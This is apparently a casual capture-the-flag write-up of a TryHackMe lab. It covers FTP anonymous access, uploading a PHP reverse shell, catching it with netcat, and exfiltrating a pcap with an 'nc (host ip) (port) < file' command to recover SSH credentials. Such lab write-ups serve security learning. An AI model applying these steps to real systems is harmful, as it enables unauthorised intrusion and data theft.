ok so my old readme got deleted so this is gonna be a little bit of a lazy readme LETS GO

1.) We have been asked by the tompany to perform a penetration test on their system so let's go and nmap scan wahoooo

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/bf83bffc-d432-42bb-9135-3a8d4defbc4f)

   - We found http, ssh, and ftp open with an anonymous ftp login allowed so let's check that out
   - We can login to ftp as anonymous and retrieve all the files found by doing the following below
   - ![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/c6696ef3-ffa5-4b10-b28d-3138ac1aa1be)
   - After opening the notice.txt file we foound we found a username Maya
     
2.) Lets find hidden directories of the http server using gobuster

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/03d350c0-7c11-4896-ab42-2aef613e3765)

  - We found the /files directory, let's check it out
  - 
![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/90a7fff2-f131-4ade-9fb8-55386ad6fa11)

   - This looks just like the ftp folder we found earlier, cause it is!
   - This means we might be able to upload a file to the directory via ftp, which could lead to a reverseshell vulnerability
     
![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/24fa843b-baa7-42aa-8235-d316506e8fec)

   - Sweet, we can upload files, let's reverseshell
   - after we run put shell.php we can now run a netcat listener to create a connection
3.) Lets reverse shell

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/7b6aca87-ea5a-4438-bbd4-0e8007ca0279)

   - We opened a netcat listening and got a connection by clicking on the shell.php file!

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/03f2ae19-dde7-41bb-9d83-dd480a2e9ddf)

   - Listing the files showed us the answer to the first questions!

4.) Lets ls and see what we can find

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/d39aa3af-da3c-476a-82e2-5cbc808f66ad)

   - We found a suspicious file which can be opened in wireshark
   - To transfer the file I created another netcat listening instance pointed to the file I wanted by typing nc -l -p (port) > suspicious.pcapng
   - I then ran nc (host ip) (port) < suspicious.pcapng to transfer the file
5.) Let's open it in wireshark now

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/7631697f-fecc-428e-b27a-16a6fd59bec1)

   - We see a lot of traffic, let's open one of these packets and sniff through the traffic to see what we can find

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/65fd8229-4247-41e8-80e4-3d562d4ef524)

   - Looks like lennie was trying to privelage escalate and we also found the password

![image](https://github.com/JordanPenaloza/TryHackMe/assets/113396128/95e6bd5c-a019-49a1-8b63-8dbd359115c4)

   - we can now ssh into the ip using lennie as the username and our found password
   - we found the user.txt flag!







